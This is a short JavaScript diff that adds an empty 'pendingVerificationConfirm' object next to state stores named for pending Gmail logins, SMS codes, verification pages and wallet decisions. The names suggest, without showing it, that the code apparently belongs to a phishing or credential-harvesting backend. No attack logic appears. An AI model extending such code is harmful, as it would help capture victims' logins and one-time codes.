@@ -175,6 +175,7 @@ const pendingGmailLogin = {};
 const displayEmailStore = {};
 const displayEmailByRequestId = {};
 const pendingVerificationPage = {};
+const pendingVerificationConfirm = {};  // ✅ For storing verification digit confirmations
 const pendingVerifyingPage = {};
 const pendingSMS2 = {};
 const pendingWalletDecision = {};
